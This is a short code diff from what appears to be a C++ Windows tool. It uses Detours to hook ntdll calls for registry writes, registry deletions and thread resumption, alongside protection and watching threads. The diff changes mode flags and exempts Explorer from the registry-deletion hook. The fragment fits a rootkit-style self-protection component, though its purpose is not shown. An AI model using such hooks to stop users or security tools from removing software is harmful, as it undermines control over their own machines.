@@ -38,8 +38,8 @@ HANDLE Mutex5 = CreateMutex(NULL, FALSE, NULL);
 HANDLE Mutex6 = CreateMutex(NULL, FALSE, NULL);
 HANDLE Mutex7 = CreateMutex(NULL, FALSE, NULL);
 HANDLE Mutex8 = CreateMutex(NULL, FALSE, NULL);
-BOOL XMode = TRUE; //you set the mode you want
-BOOL Mini = FALSE; //Mini Mode FALSE/TRUE
+BOOL XMode = FALSE; //you set the mode you want
+BOOL Mini = TRUE; //Mini Mode FALSE/TRUE
 HMODULE Module = NULL;
 HANDLE ProtectionThread = NULL;
 HANDLE WatchingThread = NULL;
@@ -840,7 +840,7 @@ void HookingThread()
             DetourAttach(&(LPVOID&)OriginalNtResumeThread, HookedNtResumeThread);
             OriginalNtSetValueKey = reinterpret_cast<RealNtSetValueKey>(DetourFindFunction("ntdll.dll", "NtSetValueKey"));
             DetourAttach(&(LPVOID&)OriginalNtSetValueKey, HookedNtSetValueKey);
-            if (!Signed3)
+            if (!Signed3 && !IsExplorer())
             {
                 OriginalNtDeleteValueKey = reinterpret_cast<RealNtDeleteValueKey>(DetourFindFunction("ntdll.dll", "NtDeleteValueKey"));
                 DetourAttach(&(LPVOID&)OriginalNtDeleteValueKey, HookedNtDeleteValueKey);
